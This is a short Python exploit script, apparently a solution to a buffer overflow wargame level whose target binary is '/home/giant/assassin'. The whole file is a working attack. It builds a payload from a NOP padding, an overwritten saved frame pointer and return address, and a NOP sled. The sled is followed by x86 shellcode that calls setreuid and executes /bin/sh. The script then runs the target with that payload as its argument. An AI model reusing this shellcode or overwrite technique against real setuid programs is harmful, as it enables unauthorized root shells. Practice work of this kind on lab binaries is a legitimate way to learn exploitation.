import os
import struct

payload = ""
sfp = 0x804851e
shell = "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
target = "/home/giant/assassin"
ret = 0xbffffbd4

def append(x):
    return payload + x

def p(x):
    return struct.pack("<L", x)

payload = append("\x90" * 44)
payload = append(p(sfp)) #ret
payload = append(p(ret))
payload = append("\x90"*100 + shell)

pid = os.fork()

if pid == 0:
    os.execv(target, (target, payload))
else:
    os.waitpid(pid, 0)